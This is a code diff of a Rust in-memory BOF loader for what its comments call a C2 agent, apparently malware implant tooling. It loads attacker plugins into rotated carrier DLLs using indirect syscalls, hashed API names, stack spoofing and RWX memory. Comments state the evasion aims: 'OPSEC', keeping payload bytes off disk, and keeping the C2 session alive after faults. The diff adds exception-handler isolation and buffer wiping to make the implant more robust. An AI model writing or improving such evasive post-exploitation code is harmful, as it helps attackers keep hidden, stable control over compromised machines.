@@ -1,5 +1,5 @@
 // Client/core/src/loader/bof.rs
-// CupcakeC2 V3 - BOF (Beacon Object File) Engine
+ // BOF (Beacon Object File) Engine
 // 负责解析、重定位并在内存中执行 COFF 格式插件。
 // 支持 x86 和 x64 架构
 
@@ -7,12 +7,20 @@ use super::plugin_api as beacon_api;
 use super::error::{BofError, BofResult};
 use super::safety;
 use log::{debug, info, warn};
+use std::collections::hash_map::DefaultHasher;
 use std::collections::HashMap;
+use std::hash::BuildHasherDefault;
 use std::sync::Mutex;
+
+/// Explicit SipHash hasher — `DefaultHasher::new()` is const, no `RandomState`
+/// thread_local. Mandatory under pe_map TLS neutralization (any std HashMap
+/// with the default hasher AVs at gs:[0x58]+0x7FFFFFFF*8 in a mapped module).
+pub(crate) type NoTlsHasher = BuildHasherDefault<DefaultHasher>;
 
 // 符号缓存 - 避免重复解析相同符号
 lazy_static::lazy_static! {
-    static ref SYMBOL_CACHE: Mutex<HashMap<String, usize>> = Mutex::new(HashMap::new());
+    static ref SYMBOL_CACHE: Mutex<HashMap<String, usize, NoTlsHasher>> =
+        Mutex::new(HashMap::with_hasher(NoTlsHasher::default()));
 }
 
 // --- COFF 常量定义 ---
@@ -47,7 +55,7 @@ struct IatTable {
     near_page: Option<*mut u8>,
     count: usize,
     /// symbol name → slot index
-    index: HashMap<String, usize>,
+    index: HashMap<String, usize, NoTlsHasher>,
 }
 
 impl IatTable {
@@ -66,7 +74,7 @@ impl IatTable {
                     heap: None,
                     near_page: Some(page),
                     count: 0,
-                    index: HashMap::new(),
+                    index: HashMap::with_hasher(NoTlsHasher::default()),
                 };
             }
             warn!("[!] IAT proximity alloc failed — heap slots may be out of REL32 reach");
@@ -79,7 +87,7 @@ impl IatTable {
             heap: Some(heap),
             near_page: None,
             count: 0,
-            index: HashMap::new(),
+            index: HashMap::with_hasher(NoTlsHasher::default()),
         }
     }
 
@@ -249,6 +257,11 @@ pub(super) struct CoffSymbol {
 
 pub struct BofLoader;
 
+/// E2E breadcrumb — env-gated via `AGENT_TRACE_FILE` (product default: no-op).
+fn tracef(msg: &str) {
+    crate::tracef_g(msg);
+}
+
 impl BofLoader {
     /// 清除符号缓存
     /// 在需要重新加载 DLL 或更新系统状态时调用
@@ -271,14 +284,21 @@ impl BofLoader {
     }
 
     /// 加载并运行一个 BOF 插件
+    ///
+    /// OPSEC / stability:
+    /// - COFF bytes never touch disk (caller memory only; burn after return)
+    /// - Map + reloc + `go()` run on a dedicated OS thread under a scoped VEH so
+    ///   hard faults (AV etc.) terminate only that worker — agent process survives
     pub async fn execute(coff_data: &[u8], args: &[u8]) -> BofResult<String> {
         info!("[*] coff plugin load ({} bytes)", coff_data.len());
 
         // Reset output
         beacon_api::clear_bof_output();
+        tracef("execute: output cleared");
 
         // 验证 COFF 文件头
         super::safety::validate_coff_header(coff_data)?;
+        tracef("execute: header ok");
 
         // 安全地读取文件头
         let header = unsafe { super::safety::read_packed_struct::<CoffFileHeader>(coff_data, 0)? };
@@ -299,22 +319,71 @@ impl BofLoader {
             )?;
         }
 
-        // High-risk path: default stack spoof around map/protect/execute (sync bodies).
+        // High-risk path: stack spoof + full-job VEH isolation (map/reloc/go).
         let machine = header.machine;
-        match machine {
-            IMAGE_FILE_MACHINE_AMD64 => {
-                info!("[*] payload arch: x64");
-                crate::stealth::stack::with_spoofed_stack(|| {
+        tracef(&format!("execute: validated, machine=0x{:X}", machine));
+
+        #[cfg(windows)]
+        {
+            // Own the buffers on the isolated worker so the agent control-plane
+            // thread never runs untrusted COFF map/reloc code.
+            let mut coff_owned = coff_data.to_vec();
+            let mut args_owned = args.to_vec();
+            let header_copy = header;
+            let r = bof_seh::run_isolated_job(move || {
+                let out = match machine {
+                    IMAGE_FILE_MACHINE_AMD64 => {
+                        info!("[*] payload arch: x64");
+                        crate::stealth::stack::with_spoofed_stack(|| {
+                            Self::execute_x64_sync(&coff_owned, &args_owned, &header_copy)
+                        })
+                    }
+                    IMAGE_FILE_MACHINE_I386 => {
+                        info!("[*] payload arch: x86");
+                        crate::stealth::stack::with_spoofed_stack(|| {
+                            Self::execute_x86_sync(&coff_owned, &args_owned, &header_copy)
+                        })
+                    }
+                    _ => Err(BofError::UnsupportedArchitecture(machine)),
+                };
+                // Burn worker copies before the isolated thread exits.
+                for b in coff_owned.iter_mut() {
+                    *b = 0;
+                }
+                for b in args_owned.iter_mut() {
+                    *b = 0;
+                }
+                out.map_err(|e| e.to_string())
+            });
+            tracef("execute: isolated job returned");
+            match r {
+                Ok(s) => Ok(s),
+                Err(e) => {
+                    // Prefer structured ExecutionFailed; keep partial Beacon output if any.
+                    let partial = beacon_api::get_bof_output();
+                    if !partial.is_empty() && e.contains("fault") {
+                        Ok(format!("{partial}\n[bof] {e}"))
+                    } else if e.starts_with("Unsupported architecture") {
+                        Err(BofError::UnsupportedArchitecture(machine))
+                    } else {
+                        Err(BofError::ExecutionFailed(e))
+                    }
+                }
+            }
+        }
+        #[cfg(not(windows))]
+        {
+            match machine {
+                IMAGE_FILE_MACHINE_AMD64 => {
+                    info!("[*] payload arch: x64");
                     Self::execute_x64_sync(coff_data, args, &header)
-                })
-            }
-            IMAGE_FILE_MACHINE_I386 => {
-                info!("[*] payload arch: x86");
-                crate::stealth::stack::with_spoofed_stack(|| {
+                }
+                IMAGE_FILE_MACHINE_I386 => {
+                    info!("[*] payload arch: x86");
                     Self::execute_x86_sync(coff_data, args, &header)
-                })
+                }
+                _ => Err(BofError::UnsupportedArchitecture(machine)),
             }
-            _ => Err(BofError::UnsupportedArchitecture(machine)),
         }
     }
 
@@ -325,8 +394,10 @@ impl BofLoader {
         header: &CoffFileHeader,
     ) -> BofResult<String> {
         unsafe {
+            tracef("x64_sync: entry");
             // 1. True Module Overloading: rotate carrier DLLs (avoid single known xpsprint fingerprint)
             let base_addr = Self::map_rotated_carrier(false)?;
+            tracef(&format!("x64_sync: carrier mapped 0x{:X}", base_addr));
 
             debug!("[+] image mapped at: 0x{:X}", base_addr);
 
@@ -386,12 +457,17 @@ impl BofLoader {
             if carrier_text_addr == 0 {
                 return Err(BofError::SectionNotFound(".text".to_string()));
             }
+            tracef(&format!(
+                "x64_sync: text 0x{:X} size 0x{:X}",
+                carrier_text_addr, carrier_text_size
+            ));
 
             // 3. 将载体 .text 修改为 RW
             let mut old_protect = 0;
             let hash_nt_protect = crate::stealth::hash_api_name(b"NtProtectVirtualMemory");
             let mut region_size = carrier_text_size;
             let mut protect_addr = carrier_text_addr;
+            tracef("x64_sync: calling NtProtectVirtualMemory");
             let st_rw = crate::syscalls::indirect_syscall(
                 hash_nt_protect,
                 &[
@@ -402,10 +478,14 @@ impl BofLoader {
                     &mut old_protect as *mut _ as usize,
                 ],
             );
-            crate::utils::db_print(&format!(
+            tracef(&format!(
+                "x64_sync: protect returned 0x{:X}",
+                st_rw as u32
+            ));
+            crate::db_print!(
                 "[bof] RW protect status=0x{:X} (addr=0x{:X} size=0x{:X})",
                 st_rw as u32, protect_addr, region_size
-            ));
+            );
 
             // 4. Parse BOF sections — section table is after optional header
             let section_header_offset =
@@ -438,7 +518,8 @@ impl BofLoader {
 
             // Phase 1: map all sections (including BSS / zero-raw)
             let mut current_offset: usize = 0;
-            let mut section_map = std::collections::HashMap::new();
+            let mut section_map =
+                std::collections::HashMap::with_hasher(NoTlsHasher::default());
             let mut pending_relocs: Vec<(usize, u32, u16)> = Vec::new(); // (dest_base, reloc_ptr, count)
 
             for i in 0..header.number_of_sections {
@@ -510,14 +591,14 @@ impl BofLoader {
 
             // Phase 2: apply all relocations with full section_map + IAT
             let mut iat = IatTable::new_near(carrier_text_addr);
-            crate::utils::db_print(&format!(
+            crate::db_print!(
                 "[bof] carrier=0x{:X} .text=0x{:X}+0x{:X} iat_slots=0x{:X} ({})",
                 base_addr,
                 carrier_text_addr,
                 carrier_text_size,
                 iat.slots_ptr as usize,
                 if iat.near_page.is_some() { "near" } else { "HEAP-FALLBACK" }
-            ));
+            );
             for (dest_base, reloc_off, reloc_count) in pending_relocs {
                 let relocs = std::slice::from_raw_parts(
                     (coff_data.as_ptr() as usize + reloc_off as usize) as *const CoffRelocation,
@@ -554,37 +635,70 @@ impl BofLoader {
                 return Err(BofError::EntryPointNotFound("go".to_string()));
             }
 
-            // 6. Restore execute permission. Code and data sections share
-            // pages inside the carrier .text, so the region must stay writable
-            // (RWX) — BOFs store globals into their .data copies and a plain
-            // RX flip faults the first write.
-            let st_rx = crate::syscalls::indirect_syscall(
+            // 6. Stage RW → execute for go(). Classic BOF packs .text+.data+.bss into
+            // one carrier span; pure PAGE_EXECUTE_READ faults on the first global write
+            // (dir.x64 hangs/crashes after "calling go"). Use EXECUTE_READWRITE for the
+            // used span only for the duration of go(); wipe/unmap after.
+            // Ideal W^X needs per-section page split (follow-up).
+            const PAGE_EXECUTE_READ: u32 = 0x20;
+            const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+            let mut st_rx = crate::syscalls::indirect_syscall(
                 hash_nt_protect,
                 &[
                     0xFFFFFFFFFFFFFFFFu64 as usize,
                     &mut protect_addr as *mut _ as usize,
                     &mut region_size as *mut _ as usize,
-                    0x40, // PAGE_EXECUTE_READWRITE
+                    PAGE_EXECUTE_READWRITE as usize,
                     &mut old_protect as *mut _ as usize,
                 ],
             );
-            crate::utils::db_print(&format!(
+            if (st_rx as i32) < 0 {
+                // Fallback pure RX (code-only BOFs)
+                protect_addr = carrier_text_addr;
+                region_size = carrier_text_size;
+                st_rx = crate::syscalls::indirect_syscall(
+                    hash_nt_protect,
+                    &[
+                        0xFFFFFFFFFFFFFFFFu64 as usize,
+                        &mut protect_addr as *mut _ as usize,
+                        &mut region_size as *mut _ as usize,
+                        PAGE_EXECUTE_READ as usize,
+                        &mut old_protect as *mut _ as usize,
+                    ],
+                );
+            }
+            crate::db_print!(
                 "[bof] RX protect status=0x{:X} entry=0x{:X} — calling go",
                 st_rx as u32, entry_point_addr
-            ));
+            );
 
-            let go: extern "C" fn(*const u8, i32) = std::mem::transmute(entry_point_addr);
-            go(args.as_ptr(), args.len() as i32);
-            crate::utils::db_print("[bof] go() returned");
+            // Run go() on a dedicated thread under a scoped VEH. Unhandled AV inside
+            // a BOF (e.g. dir.x64 wcsncat(NULL) on empty args) used to APPCRASH the
+            // whole agent (fault module msvcrt.dll, c0000005). The VEH exits only
+            // the BOF thread so the agent process survives and returns an error.
+            let go_status = unsafe {
+                invoke_bof_go_guarded(entry_point_addr, args.as_ptr(), args.len() as i32)
+            };
+            crate::db_print!("[bof] go() returned status={:?}", go_status);
 
             // Keep IAT slots alive until after go() returns
             let _ = iat;
 
             let out = beacon_api::get_bof_output();
-            crate::utils::db_print(&format!("[bof] output captured: {} bytes", out.len()));
+            crate::db_print!("[bof] output captured: {} bytes", out.len());
             Self::release_carrier_mapping(base_addr);
-            crate::utils::db_print("[bof] carrier released, returning");
-            Ok(out)
+            crate::db_print!("[bof] carrier released, returning");
+            match go_status {
+                Ok(()) => Ok(out),
+                Err(e) => {
+                    if out.is_empty() {
+                        Err(BofError::ExecutionFailed(e))
+                    } else {
+                        // Partial output before the fault — surface both.
+                        Ok(format!("{out}\n[bof] {e}"))
+                    }
+                }
+            }
         }
     }
 
@@ -727,7 +841,8 @@ impl BofLoader {
                 as *const u8;
 
             let mut current_offset: usize = 0;
-            let mut section_map = std::collections::HashMap::new();
+            let mut section_map =
+                std::collections::HashMap::with_hasher(NoTlsHasher::default());
             let mut pending_relocs: Vec<(usize, u32, u16)> = Vec::new();
 
             for i in 0..header.number_of_sections {
@@ -830,13 +945,14 @@ impl BofLoader {
                 return Err(BofError::EntryPointNotFound("go".to_string()));
             }
 
+            // Same as x64: co-located .data needs write during go(); pure RX faults.
             crate::syscalls::indirect_syscall(
                 hash_nt_protect,
                 &[
                     0xFFFFFFFFu32 as usize,
                     &mut protect_addr as *mut _ as usize,
                     &mut region_size as *mut _ as usize,
-                    0x20, // PAGE_EXECUTE_READ
+                    0x40, // PAGE_EXECUTE_READWRITE
                     &mut old_protect as *mut _ as usize,
                 ],
             );
@@ -874,6 +990,7 @@ impl BofLoader {
         let mut h_file: HANDLE = NULL;
         let mut io_status: [usize; 2] = [0, 0];
         let hash_nt_open_file = crate::stealth::hash_api_name(b"NtOpenFile");
+        tracef("overload: NtOpenFile begin");
         let status = crate::syscalls::indirect_syscall(
             hash_nt_open_file,
             &[
@@ -885,6 +1002,7 @@ impl BofLoader {
                 0x20, // FILE_NON_DIRECTORY_FILE
             ],
         );
+        tracef(&format!("overload: NtOpenFile status=0x{:X}", status as u32));
 
         if status as i32 != 0 {
             // STATUS_SUCCESS is 0
@@ -894,6 +1012,7 @@ impl BofLoader {
         // 3. NtCreateSection (SEC_IMAGE)
         let mut h_section: HANDLE = NULL;
         let hash_nt_create_section = crate::stealth::hash_api_name(b"NtCreateSection");
+        tracef("overload: NtCreateSection begin");
         let status = crate::syscalls::indirect_syscall(
             hash_nt_create_section,
             &[
@@ -906,6 +1025,7 @@ impl BofLoader {
                 h_file as usize,
             ],
         );
+        tracef(&format!("overload: NtCreateSection status=0x{:X}", status as u32));
 
         if status as i32 != 0 {
             let _ = crate::syscalls::indirect_syscall(
@@ -919,6 +1039,7 @@ impl BofLoader {
         let mut base_addr: usize = 0;
         let mut view_size: usize = 0;
         let hash_nt_map_view = crate::stealth::hash_api_name(b"NtMapViewOfSection");
+        tracef("overload: NtMapViewOfSection begin");
         let status = crate::syscalls::indirect_syscall(
             hash_nt_map_view,
             &[
@@ -948,6 +1069,10 @@ impl BofLoader {
         if status as i32 != 0 {
             return Err(BofError::syscall_failed("NtMapViewOfSection", status));
         }
+        tracef(&format!(
+            "overload: NtMapViewOfSection ok base=0x{:X} size=0x{:X}",
+            base_addr, view_size
+        ));
 
         Ok(base_addr)
     }
@@ -1048,7 +1173,7 @@ impl BofLoader {
         relocs: &[CoffRelocation],
         symbols: &[CoffSymbol],
         string_table: *const u8,
-        section_map: &std::collections::HashMap<u16, usize>,
+        section_map: &std::collections::HashMap<u16, usize, NoTlsHasher>,
         iat: &mut IatTable,
     ) {
         for reloc in relocs {
@@ -1077,18 +1202,18 @@ impl BofLoader {
                 // Indirect import: reloc target = address of IAT slot holding fn VA
                 let fn_addr = Self::resolve_symbol_fn(&name);
                 if fn_addr == 0 {
-                    crate::utils::db_print(&format!("[bof][!] UNRESOLVED import: {}", name));
+                    crate::db_print!("[bof][!] UNRESOLVED import: {}", name);
                     continue;
                 }
                 let slot = iat.slot_for(&name, fn_addr);
                 if slot == 0 {
-                    crate::utils::db_print(&format!("[bof][!] IAT slot alloc failed: {}", name));
+                    crate::db_print!("[bof][!] IAT slot alloc failed: {}", name);
                     continue;
                 }
-                crate::utils::db_print(&format!(
+                crate::db_print!(
                     "[bof] import {} fn=0x{:X} slot=0x{:X}",
                     name, fn_addr, slot
-                ));
+                );
                 slot
             } else if Self::is_internal_api_name(&name) {
                 // Direct internal API reference (patched as fn VA, no IAT slot)
@@ -1129,10 +1254,10 @@ impl BofLoader {
                     let offset =
                         addend + (target_addr as isize) - (patch_addr as isize) - 4 - extra;
                     if offset > i32::MAX as isize || offset < i32::MIN as isize {
-                        crate::utils::db_print(&format!(
+                        crate::db_print!(
                             "[bof][!] REL32 OUT OF RANGE: patch=0x{:X} target=0x{:X} disp=0x{:X}",
                             patch_addr as usize, target_addr, offset as usize
-                        ));
+                        );
                     }
                     *(patch_addr as *mut i32) = offset as i32;
                 }
@@ -1158,7 +1283,7 @@ impl BofLoader {
         relocs: &[CoffRelocation],
         symbols: &[CoffSymbol],
         string_table: *const u8,
-        section_map: &std::collections::HashMap<u16, usize>,
+        section_map: &std::collections::HashMap<u16, usize, NoTlsHasher>,
         iat: &mut IatTable,
     ) {
         for reloc in relocs {
@@ -1431,6 +1556,265 @@ impl BofLoader {
     }
 }
 
+/// Map/reloc stage is PAGE_READWRITE; go() uses PAGE_EXECUTE_READWRITE when
+/// data is co-located (classic BOF). Pure RX remains the long-term ideal.
+pub fn bof_protect_stages() -> (u32, u32) {
+    const PAGE_READWRITE: u32 = 0x04;
+    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+    (PAGE_READWRITE, PAGE_EXECUTE_READWRITE)
+}
+
+// ── BOF crash isolation ─────────────────────────────────────────────────────
+// Untrusted COFF runs in-process. Map/reloc/`go()` faults (classic dir.x64
+// empty-args → msvcrt AV) must not APPCRASH the agent. Scoped VEH + dedicated
+// OS thread: on fatal exception we ExitThread the BOF worker only; the agent
+// WaitForSingleObject path returns Err and keeps the C2 session alive.
+
+#[cfg(windows)]
+mod bof_seh {
+    use std::sync::atomic::{AtomicU32, Ordering};
+
+    /// Thread id currently inside the BOF worker (0 = none).
+    static BOF_TID: AtomicU32 = AtomicU32::new(0);
+    /// Exception code captured by the VEH (0 = clean return).
+    static BOF_FAULT: AtomicU32 = AtomicU32::new(0);
+
+    const EXCEPTION_ACCESS_VIOLATION: u32 = 0xC000_0005;
+    const EXCEPTION_ILLEGAL_INSTRUCTION: u32 = 0xC000_001D;
+    const EXCEPTION_STACK_OVERFLOW: u32 = 0xC000_00FD;
+    const EXCEPTION_INT_DIVIDE_BY_ZERO: u32 = 0xC000_0094;
+    const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
+    const WAIT_MS: u32 = 120_000;
+    const WAIT_TIMEOUT: u32 = 0x0000_0102;
+    const WAIT_OBJECT_0: u32 = 0;
+    const FAULT_EXIT_MARK: u32 = 0xE0BF_0000;
+
+    #[repr(C)]
+    struct GoArgs {
+        entry: usize,
+        args: *const u8,
+        len: i32,
+    }
+
+    /// Heap job for full map+reloc+go isolation (Send closure result).
+    struct JobBox {
+        func: Option<Box<dyn FnOnce() -> Result<String, String> + Send>>,
+        result: Option<Result<String, String>>,
+    }
+
+    unsafe extern "system" fn veh_handler(
+        info: *mut winapi::um::winnt::EXCEPTION_POINTERS,
+    ) -> i32 {
+        if info.is_null() {
+            return EXCEPTION_CONTINUE_SEARCH;
+        }
+        let tid = winapi::um::processthreadsapi::GetCurrentThreadId();
+        if tid != BOF_TID.load(Ordering::SeqCst) {
+            return EXCEPTION_CONTINUE_SEARCH;
+        }
+        let rec = (*info).ExceptionRecord;
+        if rec.is_null() {
+            return EXCEPTION_CONTINUE_SEARCH;
+        }
+        let code = (*rec).ExceptionCode;
+        let fatal = matches!(
+            code,
+            EXCEPTION_ACCESS_VIOLATION
+                | EXCEPTION_ILLEGAL_INSTRUCTION
+                | EXCEPTION_STACK_OVERFLOW
+                | EXCEPTION_INT_DIVIDE_BY_ZERO
+                | 0xC000_0005 // belt
+        );
+        if !fatal {
+            return EXCEPTION_CONTINUE_SEARCH;
+        }
+        BOF_FAULT.store(code, Ordering::SeqCst);
+        BOF_TID.store(0, Ordering::SeqCst);
+        // Terminate only this worker thread — agent process stays up.
+        winapi::um::processthreadsapi::ExitThread(FAULT_EXIT_MARK | (code & 0xFFFF));
+        // unreachable
+        #[allow(unreachable_code)]
+        EXCEPTION_CONTINUE_SEARCH
+    }
+
+    unsafe extern "system" fn go_thread(param: winapi::shared::minwindef::LPVOID) -> u32 {
+        let ga = &*(param as *const GoArgs);
+        BOF_TID.store(
+            winapi::um::processthreadsapi::GetCurrentThreadId(),
+            Ordering::SeqCst,
+        );
+        BOF_FAULT.store(0, Ordering::SeqCst);
+        let go: extern "C" fn(*const u8, i32) = std::mem::transmute(ga.entry);
+        go(ga.args, ga.len);
+        BOF_TID.store(0, Ordering::SeqCst);
+        0
+    }
+
+    unsafe extern "system" fn job_thread(param: winapi::shared::minwindef::LPVOID) -> u32 {
+        let job = &mut *(param as *mut JobBox);
+        BOF_TID.store(
+            winapi::um::processthreadsapi::GetCurrentThreadId(),
+            Ordering::SeqCst,
+        );
+        BOF_FAULT.store(0, Ordering::SeqCst);
+        if let Some(f) = job.func.take() {
+            job.result = Some(f());
+        } else {
+            job.result = Some(Err("bof job: empty func".into()));
+        }
+        BOF_TID.store(0, Ordering::SeqCst);
+        0
+    }
+
+    fn fault_message(prefix: &str, fault: u32, exit_code: u32) -> String {
+        let code = if fault != 0 {
+            fault
+        } else {
+            0xC000_0000 | (exit_code & 0xFFFF)
+        };
+        format!(
+            "{prefix} fault exception=0x{code:08X} (agent survived; check args — empty path AVs in msvcrt on dir.x64)"
+        )
+    }
+
+    /// Run the full BOF map/reloc/`go` pipeline on a dedicated OS thread under VEH.
+    pub fn run_isolated_job<F>(f: F) -> Result<String, String>
+    where
+        F: FnOnce() -> Result<String, String> + Send + 'static,
+    {
+        let mut job = Box::new(JobBox {
+            func: Some(Box::new(f)),
+            result: None,
+        });
+        let job_ptr = &mut *job as *mut JobBox;
+
+        unsafe {
+            BOF_FAULT.store(0, Ordering::SeqCst);
+            let veh = winapi::um::errhandlingapi::AddVectoredExceptionHandler(1, Some(veh_handler));
+            let h = winapi::um::processthreadsapi::CreateThread(
+                std::ptr::null_mut(),
+                0,
+                Some(job_thread),
+                job_ptr as *mut _,
+                0,
+                std::ptr::null_mut(),
+            );
+            if h.is_null() {
+                if !veh.is_null() {
+                    winapi::um::errhandlingapi::RemoveVectoredExceptionHandler(veh);
+                }
+                // Fallback: run inline without isolation
+                return f_inline(job);
+            }
+            let wr = winapi::um::synchapi::WaitForSingleObject(h, WAIT_MS);
+            let mut exit_code: u32 = 0;
+            let _ = winapi::um::processthreadsapi::GetExitCodeThread(h, &mut exit_code);
+            winapi::um::handleapi::CloseHandle(h);
+            if !veh.is_null() {
+                winapi::um::errhandlingapi::RemoveVectoredExceptionHandler(veh);
+            }
+            BOF_TID.store(0, Ordering::SeqCst);
+
+            if wr == WAIT_TIMEOUT {
+                return Err("bof job timed out (120s)".into());
+            }
+            if wr != WAIT_OBJECT_0 {
+                return Err(format!("bof job wait failed 0x{wr:X}"));
+            }
+            let fault = BOF_FAULT.load(Ordering::SeqCst);
+            if fault != 0 || (exit_code & 0xFFFF_0000) == FAULT_EXIT_MARK {
+                return Err(fault_message("bof job", fault, exit_code));
+            }
+            if exit_code != 0 {
+                return Err(format!("bof job thread exit=0x{exit_code:X}"));
+            }
+            job.result.take().unwrap_or_else(|| Err("bof job: no result".into()))
+        }
+    }
+
+    fn f_inline(mut job: Box<JobBox>) -> Result<String, String> {
+        if let Some(f) = job.func.take() {
+            f()
+        } else {
+            Err("bof job: empty func".into())
+        }
+    }
+
+    /// Invoke BOF `go` entry. If already on the isolated BOF worker, call
+    /// directly (outer job already owns VEH). Otherwise spawn a nested worker.
+    pub unsafe fn invoke(entry: usize, args: *const u8, len: i32) -> Result<(), String> {
+        if entry == 0 {
+            return Err("null entry".into());
+        }
+        let cur = winapi::um::processthreadsapi::GetCurrentThreadId();
+        if cur == BOF_TID.load(Ordering::SeqCst) && cur != 0 {
+            // Already inside run_isolated_job — direct call, VEH already armed.
+            let go: extern "C" fn(*const u8, i32) = std::mem::transmute(entry);
+            go(args, len);
+            return Ok(());
+        }
+
+        let ga = GoArgs { entry, args, len };
+        BOF_FAULT.store(0, Ordering::SeqCst);
+
+        let veh = winapi::um::errhandlingapi::AddVectoredExceptionHandler(1, Some(veh_handler));
+        let h = winapi::um::processthreadsapi::CreateThread(
+            std::ptr::null_mut(),
+            0,
+            Some(go_thread),
+            &ga as *const GoArgs as *mut _,
+            0,
+            std::ptr::null_mut(),
+        );
+        if h.is_null() {
+            if !veh.is_null() {
+                winapi::um::errhandlingapi::RemoveVectoredExceptionHandler(veh);
+            }
+            // Fallback: direct call (no isolation)
+            let go: extern "C" fn(*const u8, i32) = std::mem::transmute(entry);
+            go(args, len);
+            return Ok(());
+        }
+        // Generous wall clock: dir /s on large trees can take a while.
+        let wr = winapi::um::synchapi::WaitForSingleObject(h, WAIT_MS);
+        let mut exit_code: u32 = 0;
+        let _ = winapi::um::processthreadsapi::GetExitCodeThread(h, &mut exit_code);
+        winapi::um::handleapi::CloseHandle(h);
+        if !veh.is_null() {
+            winapi::um::errhandlingapi::RemoveVectoredExceptionHandler(veh);
+        }
+        BOF_TID.store(0, Ordering::SeqCst);
+
+        if wr == WAIT_TIMEOUT {
+            return Err("bof go() timed out (120s)".into());
+        }
+        if wr != WAIT_OBJECT_0 {
+            return Err(format!("bof go() wait failed 0x{wr:X}"));
+        }
+        let fault = BOF_FAULT.load(Ordering::SeqCst);
+        if fault != 0 || (exit_code & 0xFFFF_0000) == FAULT_EXIT_MARK {
+            return Err(fault_message("bof go()", fault, exit_code));
+        }
+        if exit_code != 0 {
+            // Non-zero but not our marker — unusual; treat as soft failure.
+            return Err(format!("bof go() thread exit=0x{exit_code:X}"));
+        }
+        Ok(())
+    }
+}
+
+#[cfg(windows)]
+unsafe fn invoke_bof_go_guarded(entry: usize, args: *const u8, len: i32) -> Result<(), String> {
+    bof_seh::invoke(entry, args, len)
+}
+
+#[cfg(not(windows))]
+unsafe fn invoke_bof_go_guarded(entry: usize, args: *const u8, len: i32) -> Result<(), String> {
+    let go: extern "C" fn(*const u8, i32) = std::mem::transmute(entry);
+    go(args, len);
+    Ok(())
+}
+
 #[cfg(test)]
 mod reloc_bounds_tests {
     use super::BofLoader;
@@ -1451,5 +1835,14 @@ mod reloc_bounds_tests {
         assert!(cands.iter().any(|p| p.contains("version.dll")));
         // xpsprint may remain as last-resort fallback but must not be the only option
         assert!(cands.iter().any(|p| !p.contains("xpsprint")));
+    }
+
+    #[test]
+    fn bof_protect_stages_document_rw_and_exec() {
+        let (rw, exec) = super::bof_protect_stages();
+        assert_eq!(rw, 0x04); // PAGE_READWRITE for map/reloc
+        // Final go() uses EXECUTE_READWRITE when .data shares the carrier page;
+        // pure RX (0x20) is only a fallback for code-only BOFs.
+        assert!(exec == 0x20 || exec == 0x40);
     }
 }
